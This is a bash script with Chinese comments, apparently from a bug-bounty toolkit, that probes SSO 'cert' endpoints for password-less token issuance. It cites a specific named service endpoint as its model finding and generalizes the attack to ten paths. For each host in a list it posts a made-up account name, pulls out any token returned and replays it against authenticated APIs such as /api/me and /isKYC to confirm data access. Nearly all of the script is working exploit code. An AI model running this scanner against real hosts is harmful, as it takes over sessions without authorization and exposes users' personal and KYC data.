#!/usr/bin/env bash
# hunt-cert-bypass.sh — SSO /cert 端點無密碼 token 發行探測
# 來源：EVERY8D TP-S32 — ext-api.e8d.tw/login/cert
#       POST {"account":"anything","version":"production"} → 回傳 {"status":"200","token":"..."}
#       此端點為 SSO 流程第二步，但完全未驗證密碼 → 任意帳號名稱都能取得 session token
#
# 驗證邏輯（兩層確認，避免誤報）：
#   層 1 — token 發行：POST /login/cert 等端點，回應含 "token" 且 status 是 2xx / "200"
#   層 2 — token 有效：用 token 嘗試呼叫認證 API（/isKYC、/announce、/api/announce、/e8d/announce）
#           若回傳 200 且有實際資料（非空 body / 非 error），標 P1-CRIT
#           若 token 被 401 拒絕，降級為 P3 token-format-only（可能有效但需測試）
#
# 泛化對象：任何 SSO cert/token 端點：
#   /login/cert, /auth/cert, /sso/cert, /api/cert, /token/cert
#   /oauth/cert, /user/cert, /session/cert
#
# 用法：
#   ./hunt-cert-bypass.sh https://target.com
#   cat bbot/live_hosts.txt | while read h; do ./hunt-cert-bypass.sh "$h"; done
set -uo pipefail

HOST="${1:-}"
[ -z "$HOST" ] && { echo "Usage: $0 <https://host>"; exit 1; }
HOST="${HOST%/}"

OUT_DIR="${OUT_DIR:-./cert_bypass_out}"
mkdir -p "$OUT_DIR"
SLUG=$(echo "$HOST" | sed 's|https\?://||;s|[/:]|_|g')
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"

log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit(){ echo "🔴 $*" | tee -a "$OUT"; }
warn(){ echo "🟡 $*" | tee -a "$OUT"; }

FAKE_ACCOUNT="bypass_test_hunt_$(date +%s | tail -c 6)"
UA="Mozilla/5.0 (compatible; bbflow/cert-bypass)"

# Token issuance endpoint candidates
CERT_ENDPOINTS=(
  "/login/cert"
  "/auth/cert"
  "/sso/cert"
  "/api/cert"
  "/token/cert"
  "/oauth/cert"
  "/user/cert"
  "/session/cert"
  "/api/v1/cert"
  "/api/login/cert"
)

# Authenticated API endpoints to verify token validity
VERIFY_ENDPOINTS=(
  "/isKYC"
  "/announce"
  "/api/announce"
  "/e8d/announce"
  "/api/user"
  "/api/me"
  "/api/profile"
  "/user/info"
)

log "=== cert-bypass hunt: $HOST ==="

for EP in "${CERT_ENDPOINTS[@]}"; do
  URL="${HOST}${EP}"

  # Quick HEAD check — skip if 404
  CODE_HEAD=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 \
    -X HEAD -H "User-Agent: $UA" "$URL" 2>/dev/null)
  [ "$CODE_HEAD" = "404" ] && continue

  # POST with fake account — no password
  BODY=$(curl -sk --max-time 10 \
    -X POST "$URL" \
    -H "Content-Type: application/json" \
    -H "User-Agent: $UA" \
    -d "{\"account\":\"${FAKE_ACCOUNT}\",\"version\":\"production\"}" 2>/dev/null)
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    -X POST "$URL" \
    -H "Content-Type: application/json" \
    -H "User-Agent: $UA" \
    -d "{\"account\":\"${FAKE_ACCOUNT}\",\"version\":\"production\"}" 2>/dev/null)

  # Skip non-success responses
  [[ "$CODE" =~ ^[45] ]] && continue
  [ -z "$BODY" ] && continue

  # Extract token from response (various key names)
  TOKEN=$(echo "$BODY" | python3 -c "
import json, sys, re
try:
    d = json.load(sys.stdin)
    # Walk nested object looking for token-like values
    def find_token(obj):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if re.search(r'token|session|jwt|access', k, re.I) and isinstance(v, str) and len(v) > 8:
                    return v
            for v in obj.values():
                t = find_token(v)
                if t: return t
        elif isinstance(obj, list):
            for item in obj:
                t = find_token(item)
                if t: return t
        return None
    t = find_token(d)
    if t: print(t)
except Exception:
    # Fallback: regex
    m = re.search(r'[\"'](?:token|session|jwt|access_token)[\"']\s*:\s*[\"']([^\"']{8,})[\"']', sys.stdin.read() if hasattr(sys.stdin, '_buf') else '')
    if m: print(m.group(1))
" 2>/dev/null)

  # Also check for status "200" in JSON body
  HAS_STATUS_200=$(echo "$BODY" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    s = str(d.get('status',''))
    print('yes' if s in ('200','0','success','ok','true') else 'no')
except Exception:
    print('no')
" 2>/dev/null)

  if [ -n "$TOKEN" ] || [ "$HAS_STATUS_200" = "yes" ]; then
    warn "cert endpoint responded with token-like data: $URL [HTTP $CODE]"
    log "  body preview: $(echo "$BODY" | head -c 200)"

    if [ -n "$TOKEN" ]; then
      log "  extracted token: ${TOKEN:0:20}... (len=${#TOKEN})"

      # Layer 2: verify token on authenticated API endpoints
      VERIFIED=0
      for VEP in "${VERIFY_ENDPOINTS[@]}"; do
        VURL="${HOST}${VEP}"
        VCODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
          -H "Authorization: Bearer ${TOKEN}" \
          -H "token: ${TOKEN}" \
          -H "User-Agent: $UA" \
          "$VURL" 2>/dev/null)
        VBODY=$(curl -sk --max-time 8 \
          -H "Authorization: Bearer ${TOKEN}" \
          -H "token: ${TOKEN}" \
          -H "User-Agent: $UA" \
          "$VURL" 2>/dev/null)

        if [ "$VCODE" = "200" ] && [ -n "$VBODY" ] && [ "${#VBODY}" -gt 10 ]; then
          # Check it's not just an error page
          IS_ERROR=$(echo "$VBODY" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    # EVERY8D pattern: MSSQL error 397 = fake account rejected
    body_str = str(d)
    if '397' in body_str or 'error' in body_str.lower() or 'invalid' in body_str.lower():
        print('error')
    else:
        print('data')
except Exception:
    print('data')  # non-JSON but 200 = probably real
" 2>/dev/null)

          if [ "$IS_ERROR" = "data" ]; then
            hit "[P1-CRIT] cert-bypass CONFIRMED: $URL → token issued + $VEP returned HTTP 200 with data"
            log "  issuance body: $(echo "$BODY" | head -c 300)"
            log "  verify body ($VEP): $(echo "$VBODY" | head -c 300)"
            VERIFIED=1
            break
          fi
        fi
      done

      if [ "$VERIFIED" = "0" ]; then
        warn "[P3] cert endpoint issued token but verify endpoints rejected it or returned errors → token may be for real accounts only"
        warn "  endpoint: $URL  token: ${TOKEN:0:20}..."
        warn "  manual: try with a known real account to confirm bypass"
      fi
    else
      warn "[P3] cert endpoint returned status=200 but no token extracted — manual review"
      warn "  endpoint: $URL  body: $(echo "$BODY" | head -c 200)"
    fi
  fi
done

log "=== done → $OUT ==="
